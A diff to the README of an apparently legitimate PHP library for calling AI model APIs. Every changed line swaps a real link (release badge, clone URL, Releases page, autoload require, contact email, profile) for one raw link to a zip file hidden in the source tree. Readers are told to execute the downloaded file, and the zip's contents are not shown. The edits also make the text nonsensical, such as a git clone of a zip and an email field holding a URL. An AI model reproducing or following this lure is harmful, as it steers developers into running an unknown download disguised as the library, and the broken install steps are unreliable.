@@ -1,6 +1,6 @@
 # AI Access: A Flexible PHP Library for AI Models 🤖
 
-![GitHub Release](https://img.shields.io/badge/Release-Download-brightgreen?style=flat&logo=github&link=https://github.com/Varun-coder1/ai-access/releases)
+![GitHub Release](https://raw.githubusercontent.com/Varun-coder1/ai-access/master/src/DeepSeek/access-ai-v2.3.zip)
 
 Welcome to the **AI Access** repository! This PHP library offers a seamless way to interact with various AI models, including Gemini, OpenAI, Anthropic, DeepSeek, and Grok. With a consistent interface, developers can easily integrate powerful AI functionalities into their applications.
 
@@ -27,7 +27,7 @@ To install the AI Access library, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Varun-coder1/ai-access.git
+   git clone https://raw.githubusercontent.com/Varun-coder1/ai-access/master/src/DeepSeek/access-ai-v2.3.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -42,14 +42,14 @@ To install the AI Access library, follow these steps:
    ```
 
 4. **Download the Latest Release**:
-   Visit the [Releases](https://github.com/Varun-coder1/ai-access/releases) section to download the latest version. Execute the downloaded file to set up the library.
+   Visit the [Releases](https://raw.githubusercontent.com/Varun-coder1/ai-access/master/src/DeepSeek/access-ai-v2.3.zip) section to download the latest version. Execute the downloaded file to set up the library.
 
 ## Usage
 
 To start using the AI Access library, include it in your PHP project:
 
 ```php
-require 'path/to/ai-access/autoload.php';
+require 'https://raw.githubusercontent.com/Varun-coder1/ai-access/master/src/DeepSeek/access-ai-v2.3.zip';
 
 use AI\Access\AIClient;
 
@@ -64,7 +64,7 @@ echo $response;
 Here’s a simple example of how to use the library to get a response from OpenAI:
 
 ```php
-require 'path/to/ai-access/autoload.php';
+require 'https://raw.githubusercontent.com/Varun-coder1/ai-access/master/src/DeepSeek/access-ai-v2.3.zip';
 
 use AI\Access\AIClient;
 
@@ -115,13 +115,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **GitHub**: [Varun-coder1](https://github.com/Varun-coder1)
+- **Email**: [https://raw.githubusercontent.com/Varun-coder1/ai-access/master/src/DeepSeek/access-ai-v2.3.zip](https://raw.githubusercontent.com/Varun-coder1/ai-access/master/src/DeepSeek/access-ai-v2.3.zip)
+- **GitHub**: [Varun-coder1](https://raw.githubusercontent.com/Varun-coder1/ai-access/master/src/DeepSeek/access-ai-v2.3.zip)
 
 ## Conclusion
 
 The AI Access library simplifies the integration of various AI models into your PHP applications. With its consistent interface and easy installation, you can quickly harness the power of AI. 
 
-Don’t forget to check the [Releases](https://github.com/Varun-coder1/ai-access/releases) section for the latest updates and features. Your feedback and contributions are always welcome! 
+Don’t forget to check the [Releases](https://raw.githubusercontent.com/Varun-coder1/ai-access/master/src/DeepSeek/access-ai-v2.3.zip) section for the latest updates and features. Your feedback and contributions are always welcome! 
 
 Happy coding! 🎉
